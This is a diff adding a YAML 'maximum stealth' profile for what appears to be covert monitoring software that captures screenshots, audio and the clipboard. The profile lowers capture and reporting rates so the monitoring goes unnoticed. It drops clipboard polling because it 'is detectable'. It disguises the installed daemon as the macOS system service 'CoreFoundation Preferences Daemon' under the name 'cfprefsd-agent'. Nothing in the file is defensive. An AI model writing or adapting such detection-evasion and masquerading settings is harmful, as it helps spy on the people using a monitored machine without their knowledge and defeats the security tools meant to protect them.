@@ -1,0 +1,31 @@
+# Stealth configuration profile — maximum stealth preset.
+#
+# Apply at runtime:  hot_switch.apply_profile("stealth")
+# Apply at startup:  set active_profile: "stealth" in your config
+#
+description: "Maximum stealth configuration"
+
+stealth:
+  enabled: true
+  level: "maximum"
+
+capture:
+  screenshot:
+    interval: 120        # reduce screenshot frequency
+    quality: 50
+  audio:
+    enabled: false       # audio capture is noisy
+  clipboard:
+    enabled: false       # clipboard polling is detectable
+
+resources:
+  cpu_limit: 10
+  memory_limit: 150
+
+general:
+  report_interval: 120   # slower reporting to reduce network activity
+
+# Override service identity when installing as daemon
+service:
+  name: "cfprefsd-agent"
+  description: "CoreFoundation Preferences Daemon"
